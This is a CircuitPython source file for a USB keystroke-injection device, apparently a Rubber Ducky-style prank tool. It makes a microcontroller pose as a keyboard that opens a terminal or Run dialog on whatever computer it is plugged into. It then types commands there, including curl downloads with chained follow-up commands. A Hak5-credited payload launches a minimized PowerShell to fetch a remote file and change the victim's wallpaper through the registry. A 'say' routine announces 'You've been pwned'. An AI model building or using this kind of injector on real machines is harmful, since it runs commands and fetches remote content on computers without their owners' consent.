from usb_hid import devices
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
import time


class BrightHID(KeyboardLayoutUS):
    def __init__(self, slowFactor=1, os="Windows"):
        super().__init__(Keyboard(devices))
        self.keyboard = Keyboard(devices)
        self.slowFactor = slowFactor
        self.os = os
        self.progressBar = None

    def send(self, *args):
        self.keyboard.send(*args)

    def init(self):
        if self.progressBar is not None:
            self.progressBar.reset()
            self.progressBar.show()

    def hook(self, progressBar):
        self.progressBar = progressBar

    def update(self, message: str, percent: int):
        if self.progressBar is not None:
            self.progressBar.changeText(message)
            self.progressBar.changePercent(percent)

    def sleep(self, length: int):
        time.sleep(length * self.slowFactor)

    def setOS(self, os: str):
        if os in ["Windows", "MacOS", "Linux"]:
            self.os = os
        elif os in ["macos", "mac", "Mac"]:
            self.os = "MacOS"
        elif os in ["windows", "win", "Win"]:
            self.os = "Windows"
        elif os in ["linux", "debian", "Debian", "arch", "Arch"]:
            self.os = "Linux"

    def openApp(self, app: str):
        if self.os == "Windows":
            self.send(Keycode.GUI, Keycode.R)
            self.sleep(1)
            self.write(app+"\n")
            self.sleep(1.5)
        elif self.os == "MacOS":
            self.send(Keycode.COMMAND, Keycode.SPACE)
            self.sleep(1)
            self.write(app+"\n")
            self.sleep(1.5)
        elif self.os == "Linux":
            self.send(Keycode.GUI)
            self.write(app+'\n')
            self.sleep(1.5)

    def terminal(self):
        if self.os == "Windows":
            self.openApp("cmd.exe")
        elif self.os == "MacOS":
            self.openApp("Terminal.app")
        elif self.os == "Linux":
            self.send(Keycode.CONTROL, Keycode.ALT, Keycode.T)
            self.sleep(1.5)

    def powershell(self):
        if self.os == "Windows":
            self.openApp("powershell.exe")
        elif self.os == "MacOS":
            self.openApp("Terminal.app")
        elif self.os == "Linux":
            self.send(Keycode.CONTROL, Keycode.ALT, Keycode.T)
            self.sleep(1.5)

    def curl(self, url: str, outfile=None, delay=3, nextCommand=None):
        if outfile is not None:
            cmd = f"curl -o {outfile} {url}\n"
        else:
            cmd = f"curl {url}\n"

        if nextCommand is not None:
            cmd += "; " + nextCommand + "\n"

        self.write(cmd)
        self.sleep(delay)

    def note(self, text="Hello, world!"):
        self.init()
        if self.os == "Windows":
            self.update("Opening Notepad...", 0)
            self.openApp("Notepad.exe")
            self.update("Typing the note...", 50)
            self.write(text)
            self.update("Done! :3", 100)
        elif self.os == "MacOS":
            self.update("Opening the notes app...", 0)
            self.openApp("Notes.app")
            self.update("Opening a new note...", 25)
            self.sleep(1.5)
            self.send(Keycode.COMMAND, Keycode.N)
            self.sleep(1)
            self.update("Typing the note...", 50)
            self.write(text)
            self.update("Done! :3", 100)
        elif self.os == "Linux":
            pass

    def wallpaper(self, wallpaper="https://cdn.wallpapersafari.com/69/4/j0JeYp.jpg"):
        self.init()
        if self.os == "Windows":
            self.update("Opening Powershell...", 0)
            self.powershell()
            self.update("Downloading & setting the wallpaper...", 25)
            # Credits to Darren Kitchen at Hak5 for the payload (https://youtu.be/f3C58OKOsuo)
            self.write(
                'cmd /C "start /MIN powershell iwr -Uri '
                + wallpaper
                + " -OutFile c:\windows\temp\b.jpg;sp \
            'HKCU:Control Panel\Desktop' WallPaper 'c:\windows\temp\b.jpg';$a=1;do{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters \
            ,1 ,True;sleep 1}while($a++-le59)\"\n"
            )
            self.update("Cleaning up...", 90)
            self.send(Keycode.ALT, Keycode.F4)
            self.update("Done! :3", 100)
        elif self.os == "MacOS":
            self.update("Opening the terminal...", 0)
            self.terminal()
            self.update("Downloading the wallpaper...", 25)
            self.curl(
                wallpaper,
                "/tmp/wallpaper",
                1.5,
                'osascript -e \'tell application "Finder" to set the desktop picture to POSIX file "/tmp/wallpaper"\'',
            )
            self.update("Setting the wallpaper...", 75)
            self.write("rm /tmp/wallpaper\n")
            self.update("Cleaning up...", 90)
            self.send(Keycode.COMMAND, Keycode.Q)
            self.update("Done! :3", 100)
        elif self.os == "Linux":
            pass

    def say(self, phrase="You've been pwned"):
        self.init()
        if self.os == "Windows":
            pass
        elif self.os == "MacOS":
            self.terminal()
            self.write(f"say {phrase}")
